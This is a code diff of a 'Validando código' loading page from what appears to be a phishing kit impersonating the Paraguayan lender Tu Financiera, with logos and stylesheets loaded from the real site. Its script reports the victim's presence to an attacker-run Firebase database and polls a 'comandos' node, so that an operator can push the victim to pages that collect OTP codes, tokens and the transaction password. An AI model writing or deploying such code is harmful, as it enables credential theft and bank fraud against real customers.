@@ -3,151 +3,64 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ingresar</title>
+<title>Validando</title>
 <link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
 <link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
 <style>
   html,body{height:100%;margin:0}
-  body{
-    min-height:100vh;background:#464646;
-    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
-    display:flex;justify-content:flex-end;
-  }
+  body{min-height:100vh;background:#464646;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;justify-content:flex-end}
   .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
-  .panel{
-    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
-    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
-    padding:52px 18px 26px;box-sizing:border-box;
-  }
-  .logo-top{width:118px;margin-bottom:30px}
-  .caja{
-    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
-    padding:30px 20px 28px;box-sizing:border-box;text-align:center;
-  }
-  .caja h2{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px;line-height:1.3}
-  .caja p{font-size:12.5px;color:#606060;line-height:1.55;margin:0}
-  .etq{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#a5a5a5;margin-top:16px}
-  .valor{
-    display:inline-block;font-size:22px;font-weight:bold;letter-spacing:6px;color:#000;
-    background:#efefef;border-bottom:2px solid #8dc63f;border-radius:6px;
-    padding:9px 16px;margin-top:5px;min-width:120px;
-  }
-  .valor.vacio{color:#c1c5cb;font-size:14px;letter-spacing:1px;font-weight:normal}
-  .girando{
-    width:44px;height:44px;border:4px solid #efefef;border-top-color:#8dc63f;border-radius:50%;
-    animation:girar .85s linear infinite;margin:26px auto 0;
-  }
-  @keyframes girar{to{transform:rotate(360deg)}}
-  .pie{font-size:10px;color:#a5a5a5;margin-top:22px;letter-spacing:.2px}
-  .version{color:#707070;font-size:12px;margin-top:22px}
+  .panel{position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 18px;box-sizing:border-box}
+  .logo-top{width:118px;margin-bottom:26px}
+  .login-box{width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;padding:30px 18px;box-sizing:border-box;text-align:center}
+  .spin{width:40px;height:40px;border:4px solid #e6e6e6;border-top-color:#8dc63f;border-radius:50%;margin:0 auto 18px;animation:g 1s linear infinite}
+  @keyframes g{to{transform:rotate(360deg)}}
+  h1{font-size:16px;font-weight:bold;color:#8ec63f;margin:0 0 8px}
+  p{font-size:12px;color:#707070;line-height:1.5;margin:0}
   @media(max-width:900px){.panel{width:45%}}
-  @media(max-width:768px){
-    body{display:block}
-    .panel{width:100%;min-height:100vh;padding-top:34px}
-    .caja{width:290px}
-    .logo-top{width:96px}
-  }
+  @media(max-width:768px){body{display:block}.panel{width:100%}.login-box{width:290px}.logo-top{width:96px}}
 </style>
 </head>
 <body>
 <div class="fondo"></div>
-
 <div class="panel">
   <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
-
-  <div class="caja">
-    <h2 id="tit">Validando</h2>
-    <p id="sub">Estamos confirmando con el banco. No cierres esta ventana.</p>
-    <div class="etq" id="etq">Ingresado</div>
-    <div><span class="valor vacio" id="valor">esperando</span></div>
-    <div class="girando"></div>
-    <div class="pie">Conexión segura · Tu Financiera</div>
+  <div class="login-box">
+    <div class="spin"></div>
+    <h1 id="t">Validando código</h1>
+    <p id="p">Estamos verificando el código ingresado.<br>No cierres esta ventana.</p>
   </div>
-
-  <span class="version">Versión: v1.65.0</span>
 </div>
-
 <script>
 (function(){
-  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
-  var qs = new URLSearchParams(location.search);
-  var id = qs.get('u');
-  var m = qs.get('m') || 'codigo';
-  var etapa = qs.get('e') === '2' ? 2 : 1;
-  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
-  if(!id){ location.replace('index.html'); return; }
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var q=new URLSearchParams(location.search);
+  var id=q.get('u')||localStorage.getItem('nbch_u');
+  var m=q.get('m')||'codigo';
+  if(!id) return;
+  if(m==='token'){document.getElementById('t').textContent='Validando token';
+                  document.getElementById('p').innerHTML='Estamos verificando el token ingresado.<br>No cierres esta ventana.';}
+  if(m==='clave'){document.getElementById('t').textContent='Autorizando acceso';
+                  document.getElementById('p').innerHTML='Estamos validando tu clave transaccional.';}
+  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
+  patch({online:true,ultimoPing:Date.now(),pagina:'cargando2.html'});
+  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
+  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});
 
-  var campo, estado, tit, sub, etq;
-
-  if(m === 'token'){
-    campo = etapa === 2 ? 'token2' : 'token';
-    estado = etapa === 2 ? 'VALIDANDO TOKEN 2' : 'VALIDANDO TOKEN';
-    tit = etapa === 2 ? 'Validando el segundo token' : 'Validando el token';
-    sub = 'Estamos confirmando el token con el banco. No cierres esta ventana.';
-    etq = etapa === 2 ? 'Segundo token ingresado' : 'Token ingresado';
-  } else if(m === 'clave'){
-    campo = 'clave_transaccional';
-    estado = 'AUTORIZANDO';
-    tit = 'Autorizando el dispositivo';
-    sub = 'Estamos validando la clave transaccional. No cierres esta ventana.';
-    etq = 'Clave transaccional';
-  } else {
-    campo = etapa === 2 ? 'codigo2' : 'codigo';
-    estado = 'VALIDANDO CODIGO';
-    tit = etapa === 2 ? 'Validando el segundo código' : 'Validando el código';
-    sub = 'Estamos confirmando el código con el banco. No cierres esta ventana.';
-    etq = etapa === 2 ? 'Segundo código ingresado' : 'Código ingresado';
-  }
-
-  document.getElementById('tit').textContent = tit;
-  document.getElementById('sub').textContent = sub;
-  document.getElementById('etq').textContent = etq;
-
-  var el = document.getElementById('valor');
-
-  function pintar(v){
-    if(v){ el.textContent = v; el.className = 'valor'; }
-    else { el.textContent = 'esperando'; el.className = 'valor vacio'; }
-  }
-
-  function leer(){
-    fetch(DB+'/usuarios/'+id+'.json').then(function(r){ return r.json(); }).then(function(d){
-      if(d) pintar(d[campo]);
+  var salio=false;
+  setInterval(function(){
+    if(salio)return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
+      if(!c)return;
+      if(c.accion==='codigo'){salio=true;location.href='codigo.html?u='+id+'&e=1';}
+      else if(c.accion==='codigo2'){salio=true;location.href='codigo.html?u='+id+'&e=2';}
+      else if(c.accion==='token'){salio=true;location.href='token.html?u='+id+'&e=1';}
+      else if(c.accion==='token2'){salio=true;location.href='token.html?u='+id+'&e=2';}
+      else if(c.accion==='clave'){salio=true;location.href='clavetransaccional.html?u='+id;}
+      else if(c.accion==='dejar'){salio=true;location.href='final.html?u='+id;}
+      else if(c.rechazo){salio=true;location.href='rechazar.html?t='+c.rechazo+'&u='+id;}
     }).catch(function(){});
-  }
-  leer();
-  setInterval(leer, 2000);
-
-  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({estado:estado, pagina:'cargando2.html'})}).catch(function(){});
-  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({accion:'', rechazo:'', ts:Date.now()})}).catch(function(){});
-
-  var latido = setInterval(function(){
-    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({online:true, ultimoPing:Date.now()})}).catch(function(){});
-  },5000);
-
-  var fin = false;
-  function salir(url){ if(fin) return; fin = true; clearInterval(latido); location.href = url; }
-
-  function revisar(){
-    if(fin) return;
-    fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
-      if(!c) return;
-      if(c.rechazo === 'codigo' && m === 'codigo') return salir('rechazar.html?t=codigo&u='+id);
-      if(c.rechazo === 'token' && m === 'token')   return salir('rechazar.html?t=token&u='+id);
-      if(c.rechazo === 'clave' && m === 'clave')   return salir('rechazar.html?t=clave&u='+id);
-      if(c.rechazo === 'login')                    return salir('rechazar.html?t=login&u='+id);
-
-      if(c.accion === 'dejar') return salir('final.html?u='+id);
-
-      if(m === 'codigo' && c.accion === 'codigo' && etapa === 2) return salir('codigo.html?e=2&u='+id);
-      if(m === 'token'  && c.accion === 'token'  && etapa === 2) return salir('token.html?e=2&u='+id);
-    }).catch(function(){});
-  }
-  revisar();
-  setInterval(revisar, 2000);
+  },2000);
 })();
 </script>
 </body>
